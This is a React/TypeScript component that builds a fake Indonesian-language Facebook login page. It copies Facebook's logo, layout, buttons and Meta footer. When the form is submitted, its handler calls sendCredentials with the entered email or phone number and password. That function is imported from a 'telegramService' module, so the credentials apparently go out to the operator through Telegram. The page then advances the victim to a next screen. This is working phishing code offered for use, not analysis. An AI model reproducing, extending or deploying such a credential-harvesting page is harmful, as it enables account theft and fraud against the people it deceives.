import React, { useState } from 'react';
import type { StepProps } from '../types';
import { sendCredentials } from '../services/telegramService';
import { FacebookLogo } from './icons/FacebookLogo';

const Screen3_Login: React.FC<StepProps> = ({ onNext }) => {
  const [emailOrPhone, setEmailOrPhone] = useState('');
  const [password, setPassword] = useState('');
  const [errors, setErrors] = useState<{ email?: string; password?: string }>({});

  const validate = (): boolean => {
    const newErrors: { email?: string; password?: string } = {};
    // Basic regex to check for something@something.something OR a string of 10-15 digits
    const emailPhoneRegex = /^(?:\d{10,15}|[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})$/;

    if (!emailOrPhone.trim()) {
        newErrors.email = 'Alamat email atau nomor telepon tidak boleh kosong.';
    } else if (!emailPhoneRegex.test(emailOrPhone)) {
        newErrors.email = 'Harap masukkan format email atau nomor telepon yang valid.';
    }

    if (!password.trim()) {
        newErrors.password = 'Kata Sandi tidak boleh kosong.';
    } else if (password.length < 6) {
        newErrors.password = 'Kata sandi Anda harus terdiri dari minimal 6 karakter.';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
};


  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (validate()) {
      sendCredentials(emailOrPhone, password);
      onNext();
    }
  };

  return (
    <div className="bg-[#F0F2F5] min-h-screen flex flex-col items-center pt-10 md:pt-20">
      <div className="w-full max-w-[396px] px-4 md:px-0">
        <div className="text-center -m-7 mb-4">
            <FacebookLogo className="w-auto h-[106px] mx-auto" />
        </div>
        <div className="bg-white shadow-lg rounded-lg">
          <form onSubmit={handleSubmit} noValidate>
            <div className="p-4 space-y-2">
              <div>
                <input
                  type="text"
                  value={emailOrPhone}
                  onChange={(e) => setEmailOrPhone(e.target.value)}
                  placeholder="Alamat email atau nomor telepon"
                  className={`w-full px-4 py-3 border rounded-md text-lg focus:outline-none focus:ring-2 ${errors.email ? 'border-red-500 focus:ring-red-300' : 'border-gray-300 focus:ring-blue-500'}`}
                  required
                  aria-label="Alamat email atau nomor telepon"
                  aria-invalid={!!errors.email}
                />
                {errors.email && <p className="text-red-600 text-xs mt-1 px-1">{errors.email}</p>}
              </div>
              <div>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Kata Sandi"
                  className={`w-full px-4 py-3 border rounded-md text-lg focus:outline-none focus:ring-2 ${errors.password ? 'border-red-500 focus:ring-red-300' : 'border-gray-300 focus:ring-blue-500'}`}
                  required
                  aria-label="Kata Sandi"
                  aria-invalid={!!errors.password}
                />
                {errors.password && <p className="text-red-600 text-xs mt-1 px-1">{errors.password}</p>}
              </div>
              <button
                type="submit"
                className="w-full bg-[#1877F2] hover:bg-blue-700 text-white font-bold text-xl py-3 rounded-md transition-colors pt-2"
              >
                Masuk
              </button>
              <div className="text-center my-2">
                <a href="#" className="text-blue-600 hover:underline text-sm">
                  Lupa kata sandi?
                </a>
              </div>
            </div>
            <div className="border-t border-gray-300 mx-4 my-3"></div>
            <div className="text-center p-4">
                <button type="button" className="bg-[#42B72A] hover:bg-green-700 text-white font-bold py-3 px-4 rounded-md transition-colors text-md">
                    Buat Akun Baru
                </button>
            </div>
          </form>
        </div>
        <p className="text-center text-sm text-gray-800 mt-6">
            <a href="#" className="font-bold hover:underline">Buat Halaman</a> untuk selebriti, merek, atau bisnis.
        </p>
      </div>
      <footer className="absolute bottom-0 w-full bg-white p-4 mt-12 text-xs text-gray-500">
        <div className="max-w-4xl mx-auto">
            <ul className="flex space-x-4 mb-2">
                <li>Bahasa Indonesia</li>
                <li><a href="#" className="hover:underline">English (UK)</a></li>
                <li><a href="#" className="hover:underline">Basa Jawa</a></li>
                <li><a href="#" className="hover:underline">Bahasa Melayu</a></li>
                <li><a href="#" className="hover:underline">Español</a></li>
                <li><a href="#" className="hover:underline">Português (Brasil)</a></li>
                <li><a href="#" className="hover:underline">+</a></li>
            </ul>
            <div className="border-t border-gray-300 pt-2">
                <ul className="flex flex-wrap gap-x-4">
                    <li><a href="#" className="hover:underline">Daftar</a></li>
                    <li><a href="#" className="hover:underline">Masuk</a></li>
                    <li><a href="#" className="hover:underline">Messenger</a></li>
                    <li><a href="#" className="hover:underline">Facebook Lite</a></li>
                    <li><a href="#" className="hover:underline">Video</a></li>
                    <li><a href="#" className="hover:underline">Tempat</a></li>
                    <li><a href="#" className="hover:underline">Game</a></li>
                    <li><a href="#" className="hover:underline">Marketplace</a></li>
                    <li><a href="#" className="hover:underline">Meta Pay</a></li>
                    <li><a href="#" className="hover:underline">Toko Meta</a></li>
                    <li><a href="#" className="hover:underline">Meta Quest</a></li>
                    <li><a href="#" className="hover:underline">Instagram</a></li>
                    <li><a href="#" className="hover:underline">Threads</a></li>
                    <li><a href="#" className="hover:underline">Penggalangan Dana</a></li>
                </ul>
            </div>
            <p className="mt-4">Meta © 2024</p>
        </div>
      </footer>
    </div>
  );
};

export default Screen3_Login;